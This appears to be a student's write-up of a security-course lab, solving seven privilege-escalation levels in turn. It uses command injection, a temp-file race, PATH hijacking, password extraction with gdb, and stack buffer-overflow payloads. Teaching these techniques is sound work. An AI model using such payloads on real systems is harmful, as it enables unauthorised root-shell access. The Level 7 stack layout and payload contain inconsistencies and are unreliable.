# Assignment 2

Solving each level as we go.
SSH into the client

```
ssh students24@appsec2026 -i students24.key -J s4508882@ssh.liacs.nl
```

# Level 1
Dictionary:
```
students24@appsec2026:/levels/level1$ ls
b.dict  level1  level1.c
```

Reading level1.c, we can see a `system()` call without any proper filtering of the input, therefore, we can simply execute a command by appending it to the word we are searching for

Malicious input:
`./level1 "xxxxx; /bin/sh"`

This opens a shell with level1 group access
Then execute `escalate`

# Level 2 
CD into level 2:
`cd /levels/level2`
Files:
```
dr-xr-x---  2 root level1  4096 Mar 17 09:48 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level2 16640 Mar 17 09:48 level2
-r--r-----  1 root level1  1337 Mar 17 09:48 level2.c
```

Executing level2 asks for input (potential buffer overflow/malicious input again)
reading level2.c
There is a buffer that is put into a `execl()` call. Looking at the docs for this
```
The exec() family of functions replaces the current process image
       with a new process image.  The functions described in this manual
       page are layered on top of execve(2).  (See the manual page for
       execve(2) for further details about the replacement of the current
       process image.)

       The initial argument for these functions is the name of a file
       that is to be executed.

       The functions can be grouped based on the letters following the
       "exec" prefix.


The const char *arg and subsequent ellipses can be thought of as
       arg0, arg1, ..., argn.  Together they describe a list of one or
       more pointers to null-terminated strings that represent the
       argument list available to the executed program.  The first
       argument, by convention, should point to the filename associated
       with the file being executed.  The list of arguments must be
       terminated by a null pointer, and, since these are variadic
       functions, this pointer must be cast (char *) NULL.

       By contrast with the 'l' functions, the 'v' functions (below)
       specify the command-line arguments of the executed program as a
       vector.
```
Therefore, it executes /bin/bash with the arguments:
`/bin/bash {file_loc} {user_input}`

so this executes our bash-script at file_loc with the user_input as an argument.
the temp file is stored as `/.runtime.sh`, we should be able to manipulate it whilst the program waits for input, and simply
change the code.

We run the program concurrently:
`./level2 &` then with a free shell, we manipulate the temp file
Full command:
```
./level2 & (sleep 1 & echo -e '#!/bin/bash\n/bin/bash -p -i' > ~/.runtime.sh & sleep 1)
```
This process has now been put into the background (can be found using `jobs`)
Call `fg` to return to the previous process, it should now have opened a (bash)ell.
Now execute `escalate` and your priveleges are fixed.

Permanently added students24 to group level2, congratulations!
/!\ Remember to log in again to reload your groups. /!\

# Level 3
Looking at the python code, there are no clear vulnerabilities. However, the system command that is run executes python3, what python3 executable this is, we do not know. So, we can determine that ourselves

## Step 1
Create a new python file
`mkdir /tmp/evilpython/`
## Step 2
Write a script 
`vim /tmp/evilpython/python3`
and write the following:
```
#!/bin/bash
./escalate
```
## Step 3: execute
Set the script to allow execution:
`chmod +x /tmp/evilpython/python3`
Then proceed to execute with new path variable
`PATH=/tmp/evilpython:$PATH ./level3`
Win (execute `escalate`).

# Level 4

Looking at the code, the generated password is stored on the stack (allocated within function call)
We can simply read the password off of the stack (there are 3 stack buffers @ 32, so we need to drop the next 96 bytes)

1. Open in `dbg ./level4`
2. Run until prompted
3. Exit to dbg (Cntrl C)
4. `backtrace` and look into the frame with the `main()` call
5. Dump rsp (stack ptr) `x/96c $rsp`
6. Read the dump (this iteration:)
```
0x7fffffffe210: 78 'N'  80 'P'  57 '9'  76 'L'  110 'n' 88 'X'  70 'F'  110 'n'
0x7fffffffe218: 67 'C'  70 'F'  107 'k' 110 'n' 48 '0'  69 'E'  87 'W'  72 'H'
0x7fffffffe220: 49 '1'  53 '5'  119 'w' 118 'v' 75 'K'  71 'G'  122 'z' 74 'J'
0x7fffffffe228: 103 'g' 107 'k' 50 '2'  90 'Z'  82 'R'  50 '2'  104 'h' 0 '\000'
```

so the password generated is `NP9LnXFnCFkn0EWH15wvKGzJgk2zR2h`

One problem: DBG ignores the bit flag. The address seems to be consistent for now (0x7fffffffe210 in multiple runs)
so we should just run it and attach gdb.
```
./level4 & PID=$!; sleep 0.1; dd if=/proc/$PID/mem bs=1 skip=$((0x7fffffffe210)) count=32 2>/dev/null; wait $PID
```

Okay, does not seem to work because of priveleges. Therefore, we need to predict.

Compile a predictor (by copying the code)
Run this command:
`PASS=$(/tmp/predictor) && (echo "a"; echo "$PASS"; sleep 0.2; echo "/bin/bash ./usr/local/bin/escalate")`

Win!

# Level 5 
There is a static file "password.h", we cannot access the file directly. Therefore we must dump it from memory.
Looking at the source code
```
#include <stdio.h>
#include <unistd.h>

#include "password.h"

int main(int argc, char* argv[]) {
    if(argc < 2)
        return 1;
    char* correct_pwd = get_password();
    int result = strcmp(correct_pwd, argv[1]);
    free(correct_pwd);
    if(result == 0) {
        printf("Authenticated\n");
        execl("/bin/sh", "/bin/sh", (char*)NULL);
    }
    else {
        printf("Wrong password\n");
    }
    return 0;
}
```
correct_pwd should store a pointer to the string with the correct password. It is free'd, therefore it should be heap allocated.
We will need to access the password before it is freed- therefore, we can set a breakpoint on strcmp, and look at which characters are being compared.

```
gdb) break strcmp
Breakpoint 2 at 0x7ffff7da7240: strcmp. (2 locations)
```

Executing until it hits the breakpoint:
```
(gdb) continue
Continuing.
Breakpoint 2.1, __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
warning: 108    ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S: No such file or directory
(gdb) frame
#0  __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
108     in ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S
(gdb) backtrace
#0  __strcmp_sse42 () at ../sysdeps/x86_64/multiarch/strcmp-sse4_2.S:108
#1  0x00005555555552ac in main ()
```
This should be the correct strcmp call. Therefore, we will take a look at the current call stack. The first argument to the function should be our target. The first argument is stored in `$rdi` register on x86-64, therefore we can simply dump the string at that address to retrieve the password
```
SuperVerySecretPassword
```
Then call escalate. Win

# Level 6
Looking at the source code
```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void do_it()
{
  execl("/bin/bash", "/bin/bash", (char*)NULL);
}

int main(int argc, char **argv)
{
  char yo[128];

  // I am sure that this function will be useful one day.
  // For now I will just print its address, so that I don't lose it.
  printf("%p\n", &do_it);

  gets(yo);
  // Maybe I should also do something with this content?
  // Let's leave it for later, I am sure that I will finish this hobby project, 
  // unlike the other 10 that I have started this month.
```

They print the address of do_it, seems like we need to redirect the RIP to the do_it address
yo can only take in 128 characters, maybe we can overwrite the RIP?

Using input `4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141`

we get a segfault, this means we get a buffer overflow (memory corruption)

We should probably take a look at what the memory looks like
Dumping the assembly we get:
```
students24@appsec2026:/levels/level6$ objdump -d ./level6

./level6:     file format elf64-x86-64

........

0000000000001189 <do_it>:
    1189:       f3 0f 1e fa             endbr64
    118d:       55                      push   %rbp
    118e:       48 89 e5                mov    %rsp,%rbp
    1191:       ba 00 00 00 00          mov    $0x0,%edx
    1196:       48 8d 05 67 0e 00 00    lea    0xe67(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    119d:       48 89 c6                mov    %rax,%rsi
    11a0:       48 8d 05 5d 0e 00 00    lea    0xe5d(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    11a7:       48 89 c7                mov    %rax,%rdi
    11aa:       b8 00 00 00 00          mov    $0x0,%eax
    11af:       e8 dc fe ff ff          call   1090 <execl@plt>
    11b4:       90                      nop
    11b5:       5d                      pop    %rbp
    11b6:       c3                      ret

00000000000011b7 <main>:
    11b7:       f3 0f 1e fa             endbr64
    11bb:       55                      push   %rbp                   <---- PUSH RBP ON STACK
    11bc:       48 89 e5                mov    %rsp,%rbp              <---- SAVE STACK PTR INTO RBP
    11bf:       48 81 ec 90 00 00 00    sub    $0x90,%rsp             <---- CLEAR ROOM FOR UTILIZATION
    11c6:       89 bd 7c ff ff ff       mov    %edi,-0x84(%rbp)
    11cc:       48 89 b5 70 ff ff ff    mov    %rsi,-0x90(%rbp)
    11d3:       48 8d 05 af ff ff ff    lea    -0x51(%rip),%rax        # 1189 <do_it>
    11da:       48 89 c6                mov    %rax,%rsi
    11dd:       48 8d 05 2a 0e 00 00    lea    0xe2a(%rip),%rax        # 200e <_IO_stdin_used+0xe>
    11e4:       48 89 c7                mov    %rax,%rdi
    11e7:       b8 00 00 00 00          mov    $0x0,%eax
    11ec:       e8 7f fe ff ff          call   1070 <printf@plt>
    11f1:       48 8d 45 80             lea    -0x80(%rbp),%rax      <----- LOAD BUFFER INPUT ONTO STACK 
    11f5:       48 89 c7                mov    %rax,%rdi
    11f8:       b8 00 00 00 00          mov    $0x0,%eax
                                                                     <----- Call will have saved the rip to the next instruction
    11fd:       e8 7e fe ff ff          call   1080 <gets@plt>
    1202:       b8 00 00 00 00          mov    $0x0,%eax
    1207:       c9                      leave
    1208:       c3                      ret
```

The buffer starts at rbp-0x80 (lea    -0x80(%rbp),%rax)

We can assume that our stack looks something like this:
```
┌─────────────────────┐  <- rsp / buffer start (rbp-0x80)
│   buffer (128 bytes)│
│                     │
├─────────────────────┤  <-  rbp
│  saved RBP (8 bytes)│
├─────────────────────┤  <- rbp+8
│  saved RIP (8 bytes)│  
└─────────────────────┘
```
Therefore we need to overwrite 136 bytes + address we want to access:
`perl -e 'print "A"x136 ."BBBBBBBB"' | ./level6`

We can execute using gdb to see what's happening
```
(gdb) run < <(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
Starting program: /levels/level6/level6 < <(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"')
warning: Probes-based dynamic linker interface failed.
Reverting to original interface.
[Detaching after fork from child process 130195]
process 130192 is executing new program: /levels/level6/level6
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x555555555189

Program received signal SIGSEGV, Segmentation fault.
0x0000555555551189 in ?? ()
(gdb) info registers rip
rip            0x555555551189      0x555555551189
(gdb) 
``` Accidentally put in the wrong addy. Fixing it gives:

```Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x555555555189
process 130206 is executing new program: /usr/bin/bash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
process 130206 is executing new program: /usr/bin/bash.orig
warning: could not find '.gnu_debugaltlink' file for /lib/x86_64-linux-gnu/libtinfo.so.6
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 1 (process 130206) exited normally]
```

So we fixed our payload!
Executing normally (using cat to keep stdin open!):
```
(perl -e 'print "A"x136 . "\x89\x51\x55\x55\x55\x55\x00\x00"'; cat) | ./level6
```
We can now call escalate.

# Level 7
Root:
```
students24@appsec2026:/levels/level7$ ls -la
total 32
dr-xr-x---  2 root level6  4096 Mar 17 09:49 .
dr-xr-xr-x 12 root root    4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level7 16328 Mar 17 09:49 level7
-r--r-----  1 root level6   907 Mar 17 09:48 level7.c
-r--r-----  1 root level7   395 Mar 17 09:48 special.h
```

```
students24@appsec2026:/levels/level7$ cat level7.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

#include "special.h"


int main(){
        int* myvalue = (int*) malloc(sizeof(int)); <--- allocate heap (store ptr in stack)

       8 + 8 + 8 + 8 + 8 + 16

        *myvalue = special_value();                <--- write value               
        int final = 0;

        printf("Can you please help me solve a difficult problem?\n");
        srand(time(NULL));
        int x = rand() % 10;
        int y = rand() % 10;
        printf("%d * %d = ?\n", x, y);
        int inputnumber = 0;
        scanf("%d", &inputnumber);
        if (inputnumber != x*y){
                printf("Maybe you should study Math instead of Security...\n");
                return 1;
        }


        printf("You are very good at maths!\nEnter your username: ");
        char name[16]; <--- also stored on stack
        scanf("%s", &name);
       

        if (final == *myvalue){ <---- look for JEQ instruction
                printf("You solved another problem today!\n");
                execl("/bin/sh", "/bin/sh", (char*)NULL);
        }

        else {
                printf("Congratulations to %s for being so good at maths! But you need to do a bit more for Security...\n", name);
        }

        return 0;
}
```

Looking at the ASM for main
```
00000000000012d8 <main>:
    12d8:       f3 0f 1e fa             endbr64
    12dc:       55                      push   %rbp
    12dd:       48 89 e5                mov    %rsp,%rbp
    12e0:       48 83 ec 30             sub    $0x30,%rsp
    12e4:       bf 04 00 00 00          mov    $0x4,%edi
    12e9:       e8 32 fe ff ff          call   1120 <malloc@plt>
    12ee:       48 89 45 f8             mov    %rax,-0x8(%rbp)
    12f2:       b8 00 00 00 00          mov    $0x0,%eax
    12f7:       e8 4d ff ff ff          call   1249 <special_value>
    12fc:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
    1300:       89 02                   mov    %eax,(%rdx)
    1302:       c7 45 f4 00 00 00 00    movl   $0x0,-0xc(%rbp)
    1309:       48 8d 05 f8 0c 00 00    lea    0xcf8(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
    1310:       48 89 c7                mov    %rax,%rdi
    1313:       e8 b8 fd ff ff          call   10d0 <puts@plt>
    1318:       bf 00 00 00 00          mov    $0x0,%edi
    131d:       e8 ee fd ff ff          call   1110 <time@plt>
    1322:       89 c7                   mov    %eax,%edi
    1324:       e8 d7 fd ff ff          call   1100 <srand@plt>
    1329:       e8 22 fe ff ff          call   1150 <rand@plt>
    132e:       89 c2                   mov    %eax,%edx
    1330:       48 63 c2                movslq %edx,%rax
    1333:       48 69 c0 67 66 66 66    imul   $0x66666667,%rax,%rax
    133a:       48 c1 e8 20             shr    $0x20,%rax
    133e:       c1 f8 02                sar    $0x2,%eax
    1341:       89 d1                   mov    %edx,%ecx
    1343:       c1 f9 1f                sar    $0x1f,%ecx
    1346:       29 c8                   sub    %ecx,%eax
    1348:       89 45 f0                mov    %eax,-0x10(%rbp)
    134b:       8b 4d f0                mov    -0x10(%rbp),%ecx
    134e:       89 c8                   mov    %ecx,%eax
    1350:       c1 e0 02                shl    $0x2,%eax
    1353:       01 c8                   add    %ecx,%eax
    1355:       01 c0                   add    %eax,%eax
    1357:       29 c2                   sub    %eax,%edx
    1359:       89 55 f0                mov    %edx,-0x10(%rbp)
    135c:       e8 ef fd ff ff          call   1150 <rand@plt>
    1361:       89 c2                   mov    %eax,%edx
    1363:       48 63 c2                movslq %edx,%rax
    1366:       48 69 c0 67 66 66 66    imul   $0x66666667,%rax,%rax
    136d:       48 c1 e8 20             shr    $0x20,%rax
    1371:       c1 f8 02                sar    $0x2,%eax
    1374:       89 d1                   mov    %edx,%ecx
    1376:       c1 f9 1f                sar    $0x1f,%ecx
    1379:       29 c8                   sub    %ecx,%eax
    137b:       89 45 ec                mov    %eax,-0x14(%rbp)
    137e:       8b 4d ec                mov    -0x14(%rbp),%ecx
    1381:       89 c8                   mov    %ecx,%eax
    1383:       c1 e0 02                shl    $0x2,%eax
    1386:       01 c8                   add    %ecx,%eax
    1388:       01 c0                   add    %eax,%eax
    138a:       29 c2                   sub    %eax,%edx
    138c:       89 55 ec                mov    %edx,-0x14(%rbp)
    138f:       8b 55 ec                mov    -0x14(%rbp),%edx
    1392:       8b 45 f0                mov    -0x10(%rbp),%eax
    1395:       89 c6                   mov    %eax,%esi
    1397:       48 8d 05 9c 0c 00 00    lea    0xc9c(%rip),%rax        # 203a <_IO_stdin_used+0x3a>
    139e:       48 89 c7                mov    %rax,%rdi
    13a1:       b8 00 00 00 00          mov    $0x0,%eax
    13a6:       e8 45 fd ff ff          call   10f0 <printf@plt>
    13ab:       c7 45 e8 00 00 00 00    movl   $0x0,-0x18(%rbp)
    13b2:       48 8d 45 e8             lea    -0x18(%rbp),%rax
    13b6:       48 89 c6                mov    %rax,%rsi
    13b9:       48 8d 05 87 0c 00 00    lea    0xc87(%rip),%rax        # 2047 <_IO_stdin_used+0x47>
    13c0:       48 89 c7                mov    %rax,%rdi
    13c3:       b8 00 00 00 00          mov    $0x0,%eax
    13c8:       e8 63 fd ff ff          call   1130 <__isoc99_scanf@plt>
    13cd:       8b 45 f0                mov    -0x10(%rbp),%eax
    13d0:       0f af 45 ec             imul   -0x14(%rbp),%eax
    13d4:       89 c2                   mov    %eax,%edx
    13d6:       8b 45 e8                mov    -0x18(%rbp),%eax
    13d9:       39 c2                   cmp    %eax,%edx

------------------------------------------------------------------------------------
                                   JE instruction to compare myvalue with input EDX is myvalue (local var)
                                   so we need a way to make sure that the value referenced on the heap is zero
    13db:       74 19                   je     13f6 <main+0x11e>
    13dd:       48 8d 05 6c 0c 00 00    lea    0xc6c(%rip),%rax        # 2050 <_IO_stdin_used+0x50>
    13e4:       48 89 c7                mov    %rax,%rdi
    13e7:       e8 e4 fc ff ff          call   10d0 <puts@plt>
    13ec:       b8 01 00 00 00          mov    $0x1,%eax
    13f1:       e9 8e 00 00 00          jmp    1484 <main+0x1ac>
    13f6:       48 8d 05 8b 0c 00 00    lea    0xc8b(%rip),%rax        # 2088 <_IO_stdin_used+0x88>
    13fd:       48 89 c7                mov    %rax,%rdi
    1400:       b8 00 00 00 00          mov    $0x0,%eax
    1405:       e8 e6 fc ff ff          call   10f0 <printf@plt>
    140a:       48 8d 45 d0             lea    -0x30(%rbp),%rax
    140e:       48 89 c6                mov    %rax,%rsi
    1411:       48 8d 05 a2 0c 00 00    lea    0xca2(%rip),%rax        # 20ba <_IO_stdin_used+0xba>
    1418:       48 89 c7                mov    %rax,%rdi
    141b:       b8 00 00 00 00          mov    $0x0,%eax
    1420:       e8 0b fd ff ff          call   1130 <__isoc99_scanf@plt>
    1425:       48 8b 45 f8             mov    -0x8(%rbp),%rax
    1429:       8b 00                   mov    (%rax),%eax
    142b:       39 45 f4                cmp    %eax,-0xc(%rbp)
    142e:       75 34                   jne    1464 <main+0x18c>
    1430:       48 8d 05 89 0c 00 00    lea    0xc89(%rip),%rax        # 20c0 <_IO_stdin_used+0xc0>
    1437:       48 89 c7                mov    %rax,%rdi
    143a:       e8 91 fc ff ff          call   10d0 <puts@plt>
    143f:       ba 00 00 00 00          mov    $0x0,%edx
    1444:       48 8d 05 97 0c 00 00    lea    0xc97(%rip),%rax        # 20e2 <_IO_stdin_used+0xe2>
    144b:       48 89 c6                mov    %rax,%rsi
    144e:       48 8d 05 8d 0c 00 00    lea    0xc8d(%rip),%rax        # 20e2 <_IO_stdin_used+0xe2>
    1455:       48 89 c7                mov    %rax,%rdi
    1458:       b8 00 00 00 00          mov    $0x0,%eax
    145d:       e8 de fc ff ff          call   1140 <execl@plt>
    1462:       eb 1b                   jmp    147f <main+0x1a7>
    1464:       48 8d 45 d0             lea    -0x30(%rbp),%rax
    1468:       48 89 c6                mov    %rax,%rsi
    146b:       48 8d 05 7e 0c 00 00    lea    0xc7e(%rip),%rax        # 20f0 <_IO_stdin_used+0xf0>
    1472:       48 89 c7                mov    %rax,%rdi
    1475:       b8 00 00 00 00          mov    $0x0,%eax
    147a:       e8 71 fc ff ff          call   10f0 <printf@plt>
    147f:       b8 00 00 00 00          mov    $0x0,%eax
    1484:       c9                      leave
    1485:       c3                      ret
```

Looking at the ASM and the source code at execution time our stack will look similar to this:
┌─────────────────────────────┐  <--- rsp
│                             │  rbp-0x38 │
│        char name[16]        │           │ 16 bytes
│                             │  rbp-0x30 │
├─────────────────────────────┤
│      int input number       │  rbp-0x28 │ 8 bytes
├─────────────────────────────┤
│           int x             │  rbp-0x20 │ 8 bytes
├─────────────────────────────┤
│           int y             │  rbp-0x18 │ 8 bytes
├─────────────────────────────┤
│         int final           │  rbp-0x10 │ 8 bytes
├─────────────────────────────┤
│    ptr to special value     │  rbp-0x8  │ 8 bytes
├─────────────────────────────┤
│         saved RBP           │  rbp      │ 8 bytes
├─────────────────────────────┤
│         saved RIP           │  rbp+0x8  │ 8 bytes
└─────────────────────────────┘

Debugging further, we can set a breakpoint during our comparison call
```
   0x000055555555542b <+339>:   cmp    DWORD PTR [rbp-0xc],eax
   0x000055555555542e <+342>:   jne    0x555555555464 <main+396> <--- break here
```
can check what values are being compared (eax to be assumed the special value, edx the test value)

Reading the frame info
```
rax            0x2c41              11329
rbx            0x7fffffffe358      140737488347992
rcx            0x0                 0
rdx            0x0                 0
rsi            0xa                 10
rdi            0x7fffffffdcc0      140737488346304
rbp            0x7fffffffe230      0x7fffffffe230
rsp            0x7fffffffe200      0x7fffffffe200
r8             0xa                 10
r9             0xffffffff          4294967295
r10            0xffffffffffffff88  -120
r11            0x7ffff7e038e0      140737352055008
r12            0x1                 1
r13            0x0                 0
r14            0x555555557d80      93824992247168
r15            0x7ffff7ffd000      140737354125312
rip            0x55555555542e      0x55555555542e <main+342>
eflags         0x293               [ CF AF SF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7fb2740      140737353819968
```

Our test value is at rbp-0xc, therefore we need to overwrite 36 bytes before overwriting the last two bytes for the special value
which we can simply read by dumping it from memory using gdb (stored in RAX)
bp:
`0x000055555555542e`
`perl -e '"A"x36 . "\x41\x2c"'`

payload:
`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,`
result:
```
Permanently added students24 to group level7, congratulations!
/!\ Remember to log in again to reload your groups. /!\
```

